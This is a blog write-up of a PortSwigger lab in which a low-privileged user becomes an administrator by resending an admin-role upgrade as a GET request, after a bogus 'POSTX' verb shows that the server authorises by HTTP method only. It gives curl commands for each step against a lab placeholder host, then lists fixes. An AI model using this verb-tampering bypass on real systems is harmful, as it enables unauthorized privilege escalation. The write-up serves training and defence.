---
layout: post
title: "PortSwigger: Method-Based Access Control Can Be Circumvented"
date: 2027-09-30 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, AccessControl]
tags: [portswigger, access-control, broken-access-control, http-method, privilege-escalation, cwe-650]
---

The last lab put the access-control check in the wrong *component*. This one puts it on the wrong *thing entirely*: the server authorizes based on the **HTTP method** instead of the action and the identity. Guard one verb, leave every other verb wide open. ([CWE-650](https://cwe.mitre.org/data/definitions/650.html), Trusting HTTP Permission Methods on the Server Side.)

## Overview

This lab gives you two accounts: an admin (`administrator:admin`) and a low-privileged user (`wiener:peter`). The admin panel can promote and demote users. The goal is to escalate `wiener` to administrator.

## The admin action

Logged in as the admin, the panel promotes a user with a plain form post:

```
POST /admin-roles
Cookie: session=<admin>

username=carlos&action=upgrade
```

The form's `method='POST'` is the only verb the UI ever uses — and, it turns out, the only verb anyone bothered to protect.

## The low-priv user hits the wall

Switch to `wiener`'s session and send the same request:

```bash
curl -sk -b "session=<wiener>" -X POST \
  https://LAB/admin-roles -d "username=wiener&action=upgrade"
```

```
HTTP/1.1 401
"Unauthorized"
```

So far, so correct. The authorization rule blocks the non-admin from posting to the admin endpoint.

## Finding the gap

Before reaching for GET, there's a one-request diagnostic that reveals *why* the block exists. Send the request with a bogus verb — `POSTX`:

```bash
curl -sk -b "session=<wiener>" -X POSTX \
  https://LAB/admin-roles -d "username=wiener&action=upgrade"
```

The response flips from `"Unauthorized"` to **`"missing parameter"`**.

That's the whole vulnerability in one line. `POSTX` is not a real method, so the authorization rule — which only matches the literal string `POST` — doesn't fire. But the handler behind it still ran (it got far enough to complain about a missing parameter). **The guard checks the verb; the handler doesn't care about the verb.**

## The bypass

If a fake verb skips the check, so does a real one the rule simply doesn't cover. Re-issue the upgrade as a **GET**, with the parameters in the query string:

```bash
curl -sk -b "session=<wiener>" \
  "https://LAB/admin-roles?username=wiener&action=upgrade" \
  -w '\nhttp=%{http_code}\n'
```

```
http=302
```

A `302` — the same success redirect the admin gets. `wiener` is now an administrator, and the lab flips to **Solved**.

## Why it worked

Authorization is supposed to answer *"is this principal allowed to perform this action?"* Here it answered a different question: *"is this a POST?"* The two only line up as long as the attacker is polite enough to use the verb you expected.

Per-verb access rules are surprisingly common because the frameworks make them easy to write:

- Java servlets: `<security-constraint>` with `<http-method>POST</http-method>`
- Spring Security: `antMatchers(HttpMethod.POST, "/admin/**")`
- nginx: `if ($request_method = POST) { return 403; }`

Every one of those guards a *single* method and silently allows the rest. GET, HEAD, PUT, and any made-up verb all reach the same handler unauthenticated.

## The fix

- **Authorize on identity and action, for every method.** The check must run regardless of verb.
- **Don't write per-verb ACLs.** Default-deny *all* methods on a protected path; add verbs back only deliberately.
- **Reject unknown methods with `405`**, don't fall through to the handler.
- **Never let a GET perform a state-changing action.**

## Takeaway

`POSTX` returning *"missing parameter"* instead of *"Unauthorized"* is the tell: the lock is on the door's *handle style*, not the door. Try the action under a verb the rule forgot — GET is usually right there.
